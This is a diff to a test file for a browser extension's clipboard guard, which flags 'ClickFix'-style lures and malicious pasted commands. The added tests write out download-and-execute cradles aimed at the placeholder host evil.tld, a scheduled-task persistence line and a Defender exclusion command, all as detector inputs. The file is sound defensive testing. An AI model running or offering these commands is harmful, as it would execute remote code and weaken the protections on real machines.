@@ -3,6 +3,7 @@ import {
   classifyClipboardWrite,
   classifyInstructionText,
   assessClickFix,
+  SAFE_CLIPBOARD_TEXT,
 } from "../../extension/lib/clipboardGuard.js";
 
 describe("classifyClipboardWrite", () => {
@@ -32,6 +33,27 @@ describe("classifyClipboardWrite", () => {
       classifyClipboardWrite("certutil -urlcache -f http://evil.tld/a.exe a.exe").malicious,
     ).toBe(true);
   });
+  it("flags newer download cradles (irm / Invoke-RestMethod)", () => {
+    expect(classifyClipboardWrite("irm https://evil.tld/a.ps1 | iex").malicious).toBe(true);
+    expect(
+      classifyClipboardWrite("Invoke-RestMethod https://evil.tld/p | Invoke-Expression").malicious,
+    ).toBe(true);
+  });
+  it("flags persistence / AV-evasion LOLBins (schtasks, Add-MpPreference)", () => {
+    expect(
+      classifyClipboardWrite('schtasks /create /tn upd /tr "calc.exe" /sc onlogon').malicious,
+    ).toBe(true);
+    const r = classifyClipboardWrite("Add-MpPreference -ExclusionPath C:\\Users\\Public");
+    expect(r.malicious).toBe(true);
+    expect(r.confidence).toBeGreaterThan(0.8); // strong signature
+  });
+  it("flags a scripting-language download-and-run one-liner", () => {
+    expect(
+      classifyClipboardWrite(
+        "python -c \"import urllib.request;urllib.request.urlopen('http://evil.tld')\"",
+      ).malicious,
+    ).toBe(true);
+  });
   it("does NOT flag a normal copied URL", () => {
     expect(classifyClipboardWrite("https://github.com/kedayam/shield").malicious).toBe(false);
   });
@@ -56,6 +78,20 @@ describe("classifyInstructionText", () => {
   it("treats a plain captcha mention alone as non-actionable", () => {
     const r = classifyInstructionText("Please complete the captcha below.");
     expect(r.confidence).toBe(0);
+  });
+  it("detects newer lure phrasings (⊞ glyph, 'paste this code', fake Ray ID)", () => {
+    expect(
+      classifyInstructionText("Press ⊞ then paste the code and hit Enter").clickFixInstructions,
+    ).toBe(true);
+    const r = classifyInstructionText("Checking your browser… Human verification. Ray ID: 8ab2");
+    expect(r.fakeVerify).toBe(true);
+  });
+});
+
+describe("clipboard neutralization", () => {
+  it("exports a safe replacement string that is not itself a command", () => {
+    expect(typeof SAFE_CLIPBOARD_TEXT).toBe("string");
+    expect(classifyClipboardWrite(SAFE_CLIPBOARD_TEXT).malicious).toBe(false);
   });
 });
 
